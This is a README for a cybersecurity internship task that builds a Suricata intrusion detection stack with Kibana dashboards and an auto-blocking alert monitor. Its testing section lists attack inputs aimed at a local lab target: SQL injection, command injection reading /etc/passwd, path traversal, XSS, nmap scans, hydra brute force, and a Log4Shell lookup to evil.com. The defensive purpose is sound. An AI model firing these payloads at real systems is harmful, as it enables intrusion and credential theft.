# Task 04 — Network Intrusion Detection System (NIDS)

> **CodeAlpha Cybersecurity Internship** | Blue Team / Detection Engineering  
> **Difficulty:** ⭐⭐⭐⭐ Advanced | **Estimated Time:** 6–8 hours

---

## 🎯 Objective

Deploy a complete Network Intrusion Detection System using **Suricata** with custom rules, continuous monitoring, automated response, and visualization via Elasticsearch/Kibana.

---

## 📂 Folder Structure

```
04_network_ids/
├── docker-compose.yml          # Full stack: Suricata + Elasticsearch + Kibana + Filebeat
├── requirements.txt            # Python deps for alert monitor
├── alert_monitor.py            # Real-time alert processing + auto-response
├── suricata/
│   ├── config/suricata.yaml    # Suricata configuration
│   ├── rules/local.rules       # 70+ custom detection rules
│   └── logs/                   # Suricata output (eve.json, fast.log, stats.log)
├── filebeat/filebeat.yml       # Log shipper config
└── README.md                   # This file
```

---

## 🚀 Quick Start

### Prerequisites
- **Docker Desktop** (Windows/Mac) or **Docker Engine** (Linux)
- **8 GB+ RAM** (Elasticsearch needs ~2GB)
- **Python 3.8+** (for alert monitor)

### 1️⃣ Start the NIDS Stack
```bash
cd 04_network_ids
docker-compose up -d
```

### 2️⃣ Verify Services
```bash
docker-compose ps
```
Expected output:
```
NAME                IMAGE                              STATUS          PORTS
nids-suricata       jasonish/suricata:latest           Up (healthy)    
nids-elasticsearch  docker.elastic.co/elasticsearch:8.11.0  Up          0.0.0.0:9200->9200/tcp
nids-kibana         docker.elastic.co/kibana:8.11.0    Up              0.0.0.0:5601->5601/tcp
nids-filebeat       docker.elastic.co/beats/filebeat:8.11.0  Up
```

### 3️⃣ Access Dashboards
| Service | URL | Credentials |
|---------|-----|-------------|
| **Kibana** | http://localhost:5601 | None (security disabled) |
| **Elasticsearch** | http://localhost:9200 | None |

### 4️⃣ Start Alert Monitor (separate terminal)
```bash
cd 04_network_ids
pip install -r requirements.txt
python alert_monitor.py
```

---

## 🔧 Suricata Rules Overview

**70+ custom rules** in `suricata/rules/local.rules` covering:

| Category | Rules | Examples |
|----------|-------|----------|
| **Web App Attacks** | 10 | SQLi (union, error, time-based), CMD injection, Path traversal, XSS, LDAPi, XXE, SSRF |
| **Auth Attacks** | 3 | SSH/FTP/HTTP brute force with thresholding |
| **Malware/C2** | 3 | HTTP beaconing, DNS tunneling, suspicious user agents |
| **Recon/Scanning** | 6 | SYN/FIN/NULL/XMAS/UDP scans, ICMP sweep |
| **Exploits** | 5 | Log4Shell, Spring4Shell, ProxyLogon, EternalBlue, BlueKeep |
| **Data Exfil** | 3 | Large POST, DNS exfil, FTP upload |
| **Policy** | 4 | Tor, crypto mining, P2P, unauthorized cloud storage |
| **ICS/OT** | 3 | Modbus unauthorized, register write, DNP3 control |

### Rule Features
- **Thresholding** - Prevents alert flooding (e.g., `count 5, seconds 300`)
- **Flow keywords** - `flow:to_server,established` for server-side attacks
- **PCRE optimization** - Content matches before regex
- **MITRE ATT&CK references** - Mapped to techniques

---

## 📊 Kibana Dashboard Setup

### 1. Create Index Pattern
1. Open http://localhost:5601
2. Go to **Stack Management → Index Patterns**
3. Create index pattern: `suricata-*` (or `filebeat-*`)
4. Select `@timestamp` as time field

### 2. Key Visualizations to Create

| Visualization | Query | Purpose |
|---------------|-------|---------|
| **Alert Timeline** | `event_type:alert` | Time series of alerts |
| **Top Attackers** | `event_type:alert` → Terms on `src_ip` | Top source IPs |
| **Attack Types** | `event_type:alert` → Terms on `alert.signature` | Most triggered rules |
| **Severity Distribution** | `event_type:alert` → Terms on `alert.severity` | Alert severity breakdown |
| **Protocol Breakdown** | `event_type:alert` → Terms on `proto` | TCP/UDP/ICMP distribution |
| **GeoIP Map** | `event_type:alert` → GeoIP on `src_ip` | Attacker geographic distribution |

### 3. Sample Dashboard
Import `dashboards/nids-overview.json` (if available) or build manually.

---

## 🤖 Alert Monitor & Auto-Response

### Features
- **Real-time tailing** of Suricata `eve.json`
- **Severity classification** (critical/high/medium/low/info)
- **Auto-block critical alerts** (Windows netsh / Linux iptables)
- **Rate-based blocking** (>100 alerts from same IP)
- **Structured logging** to `alerts/alerts.log` (JSON)

### Running
```bash
cd 04_network_ids
pip install -r requirements.txt

# Terminal 1: Start monitor
python alert_monitor.py

# Terminal 2: Generate test traffic (see below)
```

### Auto-Block Behavior
| Severity | Action |
|----------|--------|
| **Critical** (SQLi, exploits) | Immediate IP block |
| **High** (brute force, C2) | Log + alert |
| **Rate >100/IP** | Auto-block after threshold |

### View Blocked IPs
```bash
cat alerts/blocked_ips.txt
```

### View Alerts
```bash
# Real-time
tail -f alerts/alerts.log | jq .

# Summary
cat alerts/alerts.log | jq -r '.signature_id' | sort | uniq -c | sort -rn
```

---

## 🧪 Testing the NIDS

### Generate Test Alerts

#### 1. SQL Injection
```bash
# Using curl
curl -G "http://localhost:8080/search" --data-urlencode "q=test' UNION SELECT 1,2,3--"
curl "http://localhost:8080/login?user=admin' OR '1'='1&pass=test"
```

#### 2. Command Injection
```bash
curl -G "http://localhost:8080/ping" --data-urlencode "host=8.8.8.8; cat /etc/passwd"
```

#### 3. Path Traversal
```bash
curl "http://localhost:8080/file?path=../../etc/passwd"
```

#### 4. XSS
```bash
curl -G "http://localhost:8080/search" --data-urlencode "q=<script>alert(1)</script>"
```

#### 5. Port Scan (requires nmap)
```bash
# SYN scan
nmap -sS 192.168.1.100

# FIN scan
nmap -sF 192.168.1.100

# XMAS scan
nmap -sX 192.168.1.100
```

#### 6. Brute Force (requires hydra)
```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.100
hydra -l admin -P rockyou.txt ftp://192.168.1.100
```

#### 7. Malicious User Agent
```bash
curl -A "sqlmap/1.0" http://localhost:8080/
curl -A "Nmap Scripting Engine" http://localhost:8080/
```

#### 8. Log4Shell
```bash
curl -H "X-Api-Version: \${jndi:ldap://evil.com/a}" http://localhost:8080/
```

---

## 📁 Key Files Reference

| File | Purpose |
|------|---------|
| `docker-compose.yml` | Stack orchestration |
| `suricata/config/suricata.yaml` | Engine config, af-packet, outputs |
| `suricata/rules/local.rules` | 70+ custom detection rules |
| `suricata/logs/eve.json` | Main alert/event log (JSON) |
| `suricata/logs/fast.log` | Human-readable alerts |
| `suricata/logs/stats.log` | Performance stats |
| `filebeat/filebeat.yml` | Log shipper to Elasticsearch |
| `alert_monitor.py` | Real-time alert processor + auto-block |
| `alerts/alerts.log` | Processed alerts (JSONL) |
| `alerts/blocked_ips.txt` | Auto-blocked IP list |

---

## 🛠️ Troubleshooting

| Issue | Solution |
|-------|----------|
| **Suricata fails to start** | Check `docker-compose logs suricata` - usually interface issue. On Windows, use `network_mode: host` requires Linux/WSL2. For Windows native, use `network_mode: bridge` and remove `-i eth0` |
| **Elasticsearch OOM** | Increase Docker memory to 6GB+ in Docker Desktop settings |
| **Kibana not loading** | Wait 2-3 minutes for Elasticsearch to fully start |
| **No alerts in Kibana** | Check Filebeat logs: `docker-compose logs filebeat`. Verify index pattern matches (`suricata-*` or `filebeat-*`) |
| **Permission denied on block** | Windows: Run terminal as Administrator. Linux: Run with sudo |
| **High memory usage** | Reduce Elasticsearch heap: `ES_JAVA_OPTS=-Xmx512m -Xms512m` |

---

## 📚 Learning Resources

| Topic | Resource |
|-------|----------|
| Suricata User Guide | https://suricata.readthedocs.io/ |
| Suricata Rule Writing | https://suricata.readthedocs.io/en/latest/rules/index.html |
| Elastic Stack | https://www.elastic.co/guide/index.html |
| Kibana Dashboards | https://www.elastic.co/guide/en/kibana/current/dashboard.html |
| MITRE ATT&CK | https://attack.mitre.org/ |
| Emerging Threats Rules | https://rules.emergingthreats.net/ |

---

## ⚠️ Safety & Ethics

> **This NIDS is for educational/training purposes only.**
>
> - Deploy only on networks you own or have explicit permission to monitor
> - Auto-blocking modifies firewall rules - test in isolated environment first
> - Review and tune rules before production use to reduce false positives
> - Ensure compliance with local laws and regulations

---

## ✅ Submission Deliverables

- [ ] `docker-compose.yml` + configs pushed to GitHub
- [ ] Custom rules (`suricata/rules/local.rules`) — 70+ rules
- [ ] Alert monitor with auto-response (`alert_monitor.py`)
- [ ] Kibana dashboard screenshots
- [ ] Test results showing detected attacks
- [ ] CodeAlpha submission form completed

---

## 🔗 Navigation

← **Task 03** [`../03_security_code_audit/README.md`](../03_security_code_audit/README.md) | **Master README** [`../README.md`](../README.md)